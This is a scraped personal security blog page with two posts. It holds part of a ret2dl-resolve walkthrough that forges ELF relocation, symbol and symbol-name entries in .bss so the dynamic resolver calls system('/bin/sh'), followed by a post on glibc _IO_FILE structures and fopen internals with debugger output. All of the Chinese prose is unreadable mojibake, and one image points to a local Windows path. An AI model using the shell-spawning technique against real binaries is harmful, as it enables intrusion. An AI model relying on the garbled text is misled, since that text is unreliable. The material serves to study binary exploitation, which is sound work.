<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve@.GOT.PLT[0](</span><br><span class="line">	link_map=.GOT.PLT[1]</span><br><span class="line">	reloc_arg=0x20</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>ä¹Ÿå°±æ˜¯å†è§£æè°ƒç”¨ä¸€ä¸‹writeå‡½æ•°,ç›®çš„æ˜¯éªŒè¯ä¸€ä¸‹,å·²ç»è§£æè¿‡çš„ç¬¦å·,ä½¿ç”¨ropæ–¹æ³•èƒ½å¤Ÿå†æ¬¡è§¦å‘è§£æè¿‡ç¨‹,å¹¶ä¸”è¯¥è¿‡ç¨‹æ˜¯æ­£ç¡®çš„</strong></p>
<h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><p>åœ¨æœ¬é˜¶æ®µæˆ‘ä»¬åœ¨bssæ®µä¼ªé€ ä¸€ä¸ªé‡å®šä½è¡¨é¡¹, ä½†æ˜¯è¯¥è¡¨é¡¹çš„å†…å®¹æŒ‡å‘æ­£ç¡®çš„symtabè¡¨</p>
<p>ä¸ºäº†ä½¿ç”¨è¿™ä¸ªå‡é‡å®šä½è¡¨é¡¹,æˆ‘ä»¬å°†dl_runtime_resolveçš„å‚æ•°reloc_argæ”¹æˆ,è¯¥bssæ®µå‡è¡¨é¡¹ä¸çœŸçš„é‡å®šä½è¡¨çš„åç§»é‡</p>
<p>è¯¥åç§»é‡æ˜¾ç„¶ä¼šå¤§çš„ç¦»è°±,è¿œè¿œè¶…å‡ºé‡å®šä½è¡¨çš„èŒƒå›´,å› ä¸ºbsså’Œrelpltæ®µç›¸è·ç”šè¿œ</p>
<p><strong>æ­¤ä¸¾ç›®çš„æ˜¯éªŒè¯å³ä½¿ä¼ é€’çš„reloc_argè¶…è¿‡é‡å®šä½è¡¨èŒƒå›´,ä¹Ÿæ²¡æœ‰ä»»ä½•å®‰å…¨æ£€æŸ¥é˜»æ‹¦,ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿæ­£ç¡®è§£æåˆ°ç¬¦å·</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819195308717.png" alt="image-20240819195308717"></p>
<h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><p>åœ¨æœ¬é˜¶æ®µæˆ‘ä»¬æ—¢è¦æ„é€ å‡çš„é‡å®šä½è¡¨é¡¹,åˆè¦æ„é€ å‡çš„ç¬¦å·è¡¨é¡¹</p>
<p>æ­¤æ—¶å‡é‡å®šä½è¡¨é¡¹ä¸å†æŒ‡å‘æ­£ç¡®çš„ç¬¦å·,è€Œæ˜¯æŒ‡å‘æˆ‘ä»¬æ„é€ çš„ç¬¦å·</p>
<p>ä½†æ˜¯è¿™ä¸ªå‡ç¬¦å·ä¾ç„¶ç´¢å¼•æ­£ç¡®çš„ç¬¦å·åç§°</p>
<p>æ˜¾ç„¶æ­¤æ—¶reloc_argç´¢å¼•é‡å®šä½è¡¨çš„åç§»é‡è¿œè¶…é‡å®šä½è¡¨èŒƒå›´,å¹¶ä¸”å‡é‡å®šä½é¡¹ç´¢å¼•å‡ç¬¦å·çš„åç§»é‡ä¹Ÿè¿œè¶…äº†ç¬¦å·è¡¨èŒƒå›´</p>
<p><strong>æ­¤ä¸¾ç›®çš„æ˜¯éªŒè¯,å³ä½¿ç¬¦å·è¡¨çš„ç´¢å¼•è¶Šç•Œ,ä¹Ÿæ²¡æœ‰ä»»ä½•å®‰å…¨æ£€æŸ¥é˜»æ‹¦,ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿæ­£ç¡®è§£æåˆ°ç¬¦å·</strong></p>
<p><img src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20240819193641215.png" alt="image-20240819193641215"></p>
<p>æƒ³æ³•å¾ˆå¥½,ç„¶è€Œåœ¨dl_runtime_resolveä¸­,r_infoä¸åªä¼šè¢«ç”¨æ¥ç´¢å¼•ç¬¦å·è¡¨,è¿˜ä¼šç´¢å¼•versymç¬¦å·ç‰ˆæœ¬è¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    	version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819213749275.png" alt="image-20240819213749275"></p>
<p>æˆ‘ä»¬ä¾æ®å‡ç¬¦å·ä¸ç¬¦å·è¡¨çš„åç§»é‡,è®¡ç®—å‡ºr_info,è¿™ä¿è¯äº†å‡é‡å®šä½é¡¹å¯ä»¥ç´¢å¼•å‡ç¬¦å·</p>
<p>ä½†æ˜¯ä¸èƒ½ä¿è¯r_infoç´¢å¼•versymè¡¨çš„ä»€ä¹ˆåœ°æ–¹</p>
<p>å®é™…è¿è¡Œæ—¶ndx&#x3D;0x442c</p>
<p>&amp;l-&gt;l_versions&#x3D;0xf7f5a710</p>
<p>ç„¶åversionsè¡¨é‡Œé¢ä¸€é¡¹æ˜¯0x10å­—èŠ‚</p>
<p>æ‰€ä»¥version &#x3D; &amp;l-&gt;l_versions[ndx]&#x3D;0xf7f9e9d4;</p>
<p>ä¸‹ä¸€æ¡æŒ‡ä»¤å°±è¦è§£å¼•ç”¨äº†version-&gt;hash</p>
<p>ç„¶è€Œ0xf7f9e9d4ä¸Šå¹¶æ²¡æœ‰åœ¨ä»»ä½•ä¸€ä¸ªå†…å­˜æ˜ å°„åŒº,æ˜¯ä¸€ä¸ªéæ³•åœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7f95000</span> <span class="number">0xf7f96000</span> rw-p     <span class="number">1000</span>  <span class="number">32000</span> /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xffb01000</span> <span class="number">0xfff59000</span> rw-p   <span class="number">458000</span>      <span class="number">0</span> [<span class="built_in">stack</span>]</span><br></pre></td></tr></table></figure>

<p>å› æ­¤å¯¹éæ³•åœ°å€è§£å¼•ç”¨å°±æ®µé”™è¯¯äº†</p>
<p>æ€ä¹ˆä¿®å¤è¿™ä¸ªè¿‡ç¨‹å‘¢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">           version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">           <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">               version = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>å‡é‡å®šä½é¡¹çš„r_infoæ—¢ç´¢å¼•å‡ç¬¦å·è¡¨é¡¹,åˆç´¢å¼•å‡versymè¡¨é¡¹</p>
<p>å¦‚æœèƒ½æ§åˆ¶å‡versymè¡¨é¡¹ä¸ºç©º,åˆ™ndxå°±æ˜¯0,æ­¤æ—¶l_versions[ndx]&#x3D;l_versions[0]å°±ä¸€å®šæ˜¯åˆæ³•çš„äº†</p>
<p>ä¹Ÿå°±æ˜¯è¯´,æˆ‘ä»¬å¯ä»¥å¾®æ“æ§åˆ¶ä¸€ä¸‹r_infoçš„å€¼</p>
<p>å¦‚ä½•æ§åˆ¶å‘¢?</p>
<p>åŸæœ¬r_info&#x3D;0x26807,å…¶ä¸­çš„ç´¢å¼•å€¼æ˜¯0x268</p>
<p>vernumåŸºåœ°å€æ˜¯0x80482d8</p>
<p>vernum[ELFW(R_SYM)(reloc-&gt;r_info)]è¿™ä¸ªå‡è¡¨é¡¹,åœ¨0x80482d8+0x268*2&#x3D;0x080487A8ä¸Š,ä½¿ç”¨idaè§‚å¯Ÿè¿™é‡Œæ˜¯.eh_frameæ®µ</p>
<p>å¾€ä¸‹ç¿»æ‰¾ä¸€ä¸ªå…¨é›¶çš„å‡è¡¨é¡¹ä½ç½®æ¯”å¦‚0x080487C2å°±å¾ˆå¥½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:080487A8 2C                                            db  2Ch ; ,</span><br><span class="line">	...</span><br><span class="line">.eh_frame:080487C2 00                                            db    0</span><br><span class="line">.eh_frame:080487C3 00                                            db    0</span><br></pre></td></tr></table></figure>

<p>0x080487C2&#x3D;0x80482d8+index*2</p>
<p>é‚£ä¹ˆindex&#x3D;0x275</p>
<p>é‚£ä¹ˆr_infoå°±å¾—æ˜¯0x27507</p>
<p>æ³¨æ„å¦‚æœåªä¿®æ”¹å‡çš„é‡å®šä½é¡¹,ä»¤å…¶r_info&#x3D;0x27507,è¿™æ ·å°±åˆä¸èƒ½æ­£ç¡®ç´¢å¼•åˆ°å‡çš„ç¬¦å·è¡¨é¡¹äº†</p>
<p>æŒ‰ä¸‹è‘«èŠ¦æµ®èµ·ç“¢,å› æ­¤è¿˜éœ€è¦ä¿®æ­£bssæ®µä¼ªé€ çš„å‡ç¬¦å·ä½ç½®,åœ¨åŸä½ç½®åŸºç¡€ä¸ŠåŠ ä¸€ä¸ª<code>(0x275-0x268)*16</code>å³å¯</p>
<p>ä¹˜16çš„åŸå› æ˜¯,ç¬¦å·è¡¨é¡¹ä¸€ä¸ªå ç”¨16å­—èŠ‚</p>
<h4 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h4><p>åœ¨æœ¬é˜¶æ®µ,ä¼ªé€ å‡ç¬¦å·åå­—ç¬¦ä¸²,å¹¶ä»¤å‡ç¬¦å·çš„st_nameæŒ‡å‘å®ƒ,ç›®çš„æ˜¯è¯æ˜å³ä½¿st_nameè¿œè¶…strtabèŒƒå›´,ä¾ç„¶æ²¡æœ‰ä»»ä½•å®‰å…¨æ£€æŸ¥é˜»æ‹¦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820103319870.png" alt="image-20240820103319870"></p>
<h4 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h4><p>æŠŠstage5ä¸­çš„å‡ç¬¦å·åå­—ç¬¦ä¸²æ”¹æˆâ€œsystemâ€,å¹¶æŠŠwriteçš„å‚æ•°(1,â€œ&#x2F;bin&#x2F;shâ€,â€œ7â€)æ”¹æˆsystemçš„å‚æ•°(â€œ&#x2F;bin&#x2F;shâ€)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820111602402.png" alt="image-20240820111602402"></p>
<h2 id="åœ¨ç›®æ ‡æ¨¡å—ä¸­é˜´æš—åœ°çˆ¬è¡Œ"><a href="#åœ¨ç›®æ ‡æ¨¡å—ä¸­é˜´æš—åœ°çˆ¬è¡Œ" class="headerlink" title="åœ¨ç›®æ ‡æ¨¡å—ä¸­é˜´æš—åœ°çˆ¬è¡Œ"></a>åœ¨ç›®æ ‡æ¨¡å—ä¸­é˜´æš—åœ°çˆ¬è¡Œ</h2><p>åˆ†æäº†<code>_dl_fixup</code>çš„æºç ä¹‹å,å·²ç»èƒ½å¤Ÿç†è§£ret2dl-resolveçš„åŸç†äº†</p>
<p>ä¸‹é¢çš„é—®é¢˜æ˜¯,<code>_dl_fixup</code>ä¸­è°ƒç”¨çš„<code>_dl_lookup_symbol_x</code>å‡½æ•°,æ˜¯å¦‚ä½•æŸ¥æ‰¾ç¬¦å·çš„å‘¢?</p>
<p>å¯æƒ³è€ŒçŸ¥çš„æ˜¯,<code>glibc</code>ä¸­çš„ç¬¦å·æˆç™¾ä¸Šåƒ,å¦‚æœçº¯çº¯ä½¿ç”¨ç¬¦å·åå­—ç¬¦ä¸²,è¿›è¡Œæ¨¡å¼åŒ¹é…,é‚£å¯çœŸæ˜¯æ…¢äº†å»äº†</p>
<p>åˆ°åº•æ€ä¹ˆåœ¨ç›®æ ‡æ¨¡å—ä¸­è§£æç¬¦å·çš„å‘¢?</p>
<p><a target="_blank" rel="noopener" href="https://blogs.oracle.com/solaris/post/gnu-hash-elf-sections">GNU Hash ELF Sections (oracle.com)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-223668.htm">ç¿»è¯‘]GNU Hash ELF Sections-å¤–æ–‡ç¿»è¯‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p>
<h2 id="ç¬¦å·è§£æä¸­çš„å“ˆå¸Œç®—æ³•"><a href="#ç¬¦å·è§£æä¸­çš„å“ˆå¸Œç®—æ³•" class="headerlink" title="ç¬¦å·è§£æä¸­çš„å“ˆå¸Œç®—æ³•"></a>ç¬¦å·è§£æä¸­çš„å“ˆå¸Œç®—æ³•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve</span><br><span class="line">	_dl_fixup</span><br><span class="line">		_dl_lookup_symbol_x</span><br><span class="line">			do_lookup_x</span><br><span class="line">				do_lookup_unique</span><br><span class="line">					enter_unique_sym</span><br></pre></td></tr></table></figure>












































































      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/IO%20FILE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/IO%20FILE/" class="post-title-link" itemprop="url">IO_FILE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-17 23:10:00" itemprop="dateCreated datePublished" datetime="2024-10-17T23:10:00+08:00">2024-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-19 23:38:59" itemprop="dateModified" datetime="2024-10-19T23:38:59+08:00">2024-10-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO FILE"></a>IO FILE</h1><p>FILE,fopen,freadç­‰å‡½æ•°æ˜¯glibcä¸ºcè¯»å†™æ–‡ä»¶å‡†å¤‡çš„æ•°æ®ç»“æ„å’Œå‡½æ•°</p>
<blockquote>
<p>linuxæ“ä½œç³»ç»Ÿä¹Ÿæä¾›äº†<code>open</code>,<code>read</code>ç­‰ä¸€ç³»åˆ—æ–‡ä»¶æ“ä½œå‡½æ•°</p>
<p>ä¸¤è€…çš„åŒºåˆ«æ˜¯,linuxè¿™ä¸€å¥—ç³»ç»Ÿè°ƒç”¨åŸºäºæ–‡ä»¶æè¿°ç¬¦<code>fd</code>,</p>
<p>ä½†æ˜¯glibcæ–‡ä»¶ioè¿™ä¸€å¥—åŸºäºæ–‡ä»¶æŒ‡é’ˆ<code>_IO_FILE*</code>,æŒ‡å‘ä¸€ä¸ª<code>FILE</code>å¯¹è±¡,è¿™ä¸ªå¯¹è±¡ä¸­åŒ…è£…ç€æ–‡ä»¶æè¿°ç¬¦<code>fd</code></p>
</blockquote>
<h2 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h2><p>FILEç›¸å…³çš„å£°æ˜åœ¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">glibc2.27/libio/libioP.h</span><br><span class="line">glibc2.27/libio/bits/libio.h</span><br></pre></td></tr></table></figure>

<p><code>FILE</code>å®é™…ä¸Šæ˜¯<code>_IO_FILE</code>çš„åˆ«å,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/ox <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">int</span> _flags;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">char</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"><span class="comment">/* 0x0070      |  0x0004 */</span>    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="comment">/* 0x0074      |  0x0004 */</span>    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="comment">/* 0x0078      |  0x0008 */</span>    <span class="type">__off_t</span> _old_offset;</span><br><span class="line"><span class="comment">/* 0x0080      |  0x0002 */</span>    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line"><span class="comment">/* 0x0082      |  0x0001 */</span>    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"><span class="comment">/* 0x0083      |  0x0001 */</span>    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0088      |  0x0008 */</span>    _IO_lock_t *_lock;</span><br><span class="line"><span class="comment">/* 0x0090      |  0x0008 */</span>    <span class="type">__off64_t</span> _offset;</span><br><span class="line"><span class="comment">/* 0x0098      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a8      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line"><span class="comment">/* 0x00b0      |  0x0008 */</span>    <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="comment">/* 0x00b8      |  0x0008 */</span>    <span class="type">size_t</span> __pad5;</span><br><span class="line"><span class="comment">/* 0x00c0      |  0x0004 */</span>    <span class="type">int</span> _mode;</span><br><span class="line"><span class="comment">/* 0x00c4      |  0x0014 */</span>    <span class="type">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  216 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>x86_64</code>ä¸Š,<code>FILE</code>ç»“æ„ä½“å¤§å°ä¸º<code>0xd8</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  p <span class="title function_">sizeof</span><span class="params">(FILE)</span></span><br><span class="line">$5 = <span class="number">0xd8</span></span><br></pre></td></tr></table></figure>

<p>åœ¨glibcä¸­ä¿å­˜äº†ä¸€ä¸ªå…¨å±€æŒ‡é’ˆ<code>_IO_list_all</code></p>
<p>å®ƒæŒ‡å‘ç¨‹åºç¬¬ä¸€ä¸ª<code>IO_FILE</code>ç»“æ„ä½“,ä¹Ÿå°±æ˜¯<code>stderr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  ptype _IO_list_all</span><br><span class="line">type = <span class="keyword">struct</span> _IO_FILE_plus &#123;</span><br><span class="line">    _IO_FILE file;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125; *</span><br><span class="line">gefâ¤  p &amp;_IO_list_all</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7ffff7dd3660</span> &lt;__GI__IO_list_all&gt;</span><br><span class="line">gefâ¤  p _IO_list_all</span><br><span class="line">$<span class="number">8</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7ffff7dd3680</span> &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šæ‰“å°å…¶ç±»å‹æ—¶å‘ç°å¹¶ä¸æ˜¯ä¸€ä¸ª<code>_IO_FILE</code>,è€Œæ˜¯ä¸€ä¸ª<code>_IO_FILE_plus</code>,è¿™ä¸¤è€…æ˜¯åŒ…å«å…³ç³»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>stderr,stdout,stdin</code>,å®é™…ä¸Šå°±æ˜¯ä¸‰ä¸ªFILE</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924184530135.png" alt="image-20240924184530135"></p>
<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fopen	_IO_new_fopen @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">87</span></span><br><span class="line">	-&gt;__fopen_internal @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">56</span></span><br><span class="line">		</span><br><span class="line">        new_f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> locked_FILE));		<span class="comment">//locked_FILE = &#123;IO_FILE_plus fp; _IO_lock_t; _IO_wide_data;&#125;</span></span><br><span class="line">		</span><br><span class="line">		_IO_JUMPS	<span class="comment">//new_f-&gt;fp-&gt;vtable = &amp;_IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        -&gt;_IO_new_file_init_internal @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">106</span></span><br><span class="line">            -&gt;_IO_link_in @glibc<span class="number">-2.27</span>/libio/genops.c:<span class="number">86</span></span><br><span class="line">				fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;		<span class="comment">//å¤´æ’æ³•ä¸Šé“¾</span></span><br><span class="line">				_IO_list_all = fp;</span><br><span class="line"></span><br><span class="line">		-&gt;_IO_new_file_fopen @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">212</span></span><br><span class="line">            è¯­æ³•åˆ†ææ‰“å¼€æ¨¡å¼(rwa/+xbmce)</span><br><span class="line">            -&gt;_IO_file_open @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">181</span></span><br><span class="line">                -&gt;file._fileno = open() ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨,è¿”å›æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">                -&gt;_IO_link_in										<span class="comment">//å®é™…ä¸Šå·²ç»åœ¨_IO_link_inä¸Šè¿‡é“¾äº†,å“ˆåŸºç±³çŸ¥é“å·²ç»ä¸Šé“¾ä¼šè‡ªå·±åˆ¤é‡çš„</span></span><br><span class="line">                </span><br><span class="line">        å¦‚æœ_IO_new_file_fopenè¿”å›äº†æ–‡ä»¶æŒ‡é’ˆfp,è¯´æ˜æ‰“å¼€æ–‡ä»¶æˆåŠŸ</span><br><span class="line">        å¦åˆ™-&gt;_IO_un_link ä¸‹é“¾ç„¶å <span class="built_in">free</span>(new_f)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924183957858.png" alt="file = fopen"></p>
<h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp);</span><br></pre></td></tr></table></figure>

<p>ä»fpæŒ‡å‘çš„æ–‡ä»¶, æ¯æ¬¡è¯»å–sizeå®½åº¦çš„æ•°æ®,è¯»å–countä¸ªå•ä½çš„æ•°æ®,åˆ°ç¼“å†²åŒºbuf, è¿”å›å®é™…è¯»å–å­—èŠ‚æ•°</p>
